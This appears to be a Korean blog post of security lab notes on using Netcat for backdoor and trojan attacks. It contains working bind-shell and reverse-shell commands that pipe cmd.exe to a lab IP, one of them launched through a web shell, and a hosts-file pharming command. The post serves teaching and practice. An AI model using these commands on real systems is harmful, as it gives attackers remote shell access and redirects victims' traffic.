---
title:  "Netcat을 활용한 web 해킹"
excerpt: "Netcat과 web-shell을 활용한 back-door, trojan 공격 실습"

categories: web-security
tags:
  - [netcat, web-shell]

toc: true
toc_sticky: true
 
date: 2022-05-11-00:00
last_modified_at: 2022-05-11-00:01
---
### Netcat이란?
* * *
- 대상 네트워크에 고양이처럼 몰래 왔다갔다하는 툴
- RAT (Remote Access Trojan)의 일종 : 네트워크 기능이 있는 실행파일
- 54kbyte 짜리 작은 용량으로 서버도 되고 

#### Backdoor 와 Trojan 차이

##### Backdoor
* * *
- Victim 의 포트를 열고 Victim에 접근
- 실제로 써먹기 어려운 문제가 있음
- 포트를 열어줘야하고 방화벽도 열어야 함
- 방화벽에 막혀서 외부에서 접근이 쉽지 않음 (대부분 차단함)
- Victim 에서 

```bash
# C:\ 에 nc.exe를 설치하고
$ nc -l -p 8000 -e cmd.exe
```

- Attacker 에서

```bash
$ sudo nc 192.168.89.131 8000
```

##### Trojan
* * *
- Attacker 의 포트를 열어놓고 Victim이 오기를 기다림
- 속임수를 써서 메일을 보냄, 첨부파일 안에 악성코드가 들어있음, 악성코드는 외부로 연결
- 보통 외부로 나가는 연결에 대해서는 방화벽이 열려 있음 > back door 보다 공격 용이
- Attacker 에서 trojan 열어놓고

```bash
$ sudo nc -l -p 8000
```

- victim에서 attacker에 접근하면 victim과 연결됨

![](../../assets/images/20220523-095653.png){: .center}

- Trojan 열어놓고 Webshell로

```bash
$ C:\\nc 192.168.89.133 8000 -e cmd.exe 
```

![](../../assets/images/20220523-100335.png){: .center}

**Pharming 공격**

```bash
C:/WINDOWS/system32/drivers/etc> echo 223.130.195.200 blabla.com >> hosts
```

- Explorer 주소창에 blabla.com 을 입력하면 네이버로 접속

![](../../assets/images/20220523-100223.png){: .center}